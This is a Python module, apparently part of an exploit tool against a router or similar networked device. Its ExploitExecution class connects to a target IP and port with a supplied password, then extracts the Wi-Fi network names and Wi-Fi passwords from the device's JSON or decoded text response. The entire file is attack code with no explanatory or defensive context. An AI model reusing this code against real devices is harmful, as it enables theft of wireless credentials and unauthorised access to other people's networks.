#!/usr/bin/python3

from Connection import Connection
from DecodeData import DecodeData
from Wireless import Wireless

class ExploitExecution:
    def __init__(self, password, ip, port):
        self.password = password
        self.ip = ip
        self.port = port
        self._response = self.execute()
    
    def execute(self):
        request = Connection(self.password)
        response = request.connect(self.ip, self.port)

        try:
            response_raw = response.json()
            data = {
                'ssid': response_raw['wifiBasicCfg']['wifiSSID'],
                'security': response_raw['wifiBasicCfg']['wifiPwd']
            }
            obj = Wireless(data)
            return obj._wireless
        except Exception:
            pass
                
        try:    
            decode_response = DecodeData(response.text)
            [[ssid, security, _ssid, _security]] = [data for data in decode_response._response]

            data = {
                'ssid': ssid,
                'security': security,
                '_ssid': _ssid,
                '_security': _security
            }

            obj = Wireless(data)
            return obj._wireless
        except Exception:
            return
